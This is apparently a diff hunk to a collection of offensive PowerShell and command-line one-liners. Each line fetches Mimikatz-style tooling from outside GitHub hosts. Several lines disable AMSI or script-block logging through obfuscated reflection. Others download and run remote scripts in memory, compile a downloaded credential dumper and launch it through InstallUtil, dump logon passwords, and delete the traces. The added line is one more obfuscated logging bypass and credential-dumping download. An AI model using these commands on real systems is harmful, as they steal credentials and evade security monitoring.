@@ -18,6 +18,8 @@ powershell -version 2 -Command [Ref].Assembly.GetType('System.Management.Automat
 
 powershell -version 2 -Command IEX ('if(0){{{0}}}' -f $(0 -as [char]) + '[Ref].Assembly.GetType("System.Management.Automation.Amsi'+'Utils").GetField("amsi'+'InitFailed","NonPublic,Static").SetValue($null,$true)');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1');IEX ('if(0){{{0}}}' -f $(0 -as [char]) + 'Invoke-'+'Mimiadios -DumpCreds')
 
+[ScriptBlock]."Get`Fiel`d"('signatures','N'+'onPublic,Static').SetValue($NULL,(New-Object Collections.Generic.HashSet[string]));$e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $e.downloadstring('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1');Invoke-Adios -AdiosCreds
+
 cd %temp% && powershell -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('https://gist.githubusercontent.com/analyticsearch/7b614f8badabe5bedf1d88056197db76/raw/13966117e4ba13be5da0c4dc44ac9ebfd61fe22a','katz.cs'); && cd c:\Windows\Microsoft.NET\Framework64\v4.* && csc.exe /unsafe /reference:System.IO.Compression.dll /out:katz.exe %temp%\\katz.cs && InstallUtil.exe /logfile= /LogToConsole=false /U katz.exe && katz.exe log privilege::debug sekurlsa::logonpasswords exit && del katz.* && move mimikatz.log %temp%\\katz.log && cd %temp% && del %temp%\\katz.cs
 
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/analyticsearch/commercial/master/wget.exe', 'C:\Support\wget.exe') }"
